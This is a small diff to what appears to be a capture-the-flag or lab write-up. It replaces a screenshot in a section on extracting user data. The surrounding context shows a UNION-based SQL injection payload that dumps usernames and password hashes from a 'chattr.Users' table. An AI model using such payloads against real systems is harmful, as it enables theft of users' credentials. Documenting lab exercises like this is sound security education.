@@ -99,7 +99,7 @@ Lets inspect the "Username" and "Password"
 
     ') UNION SELECT 1,2,Username,Password FROM chattr.Users-- -
 
-<img width="1002" height="733" alt="passwords" src="https://github.com/user-attachments/assets/40ab2e69-2840-4690-a04d-8a831a1df151" />
+<img width="1002" height="712" alt="passwd" src="https://github.com/user-attachments/assets/fe907284-8954-43e2-811a-5ff60d03eab4" />
 
 - This gives us the password hashes!
 
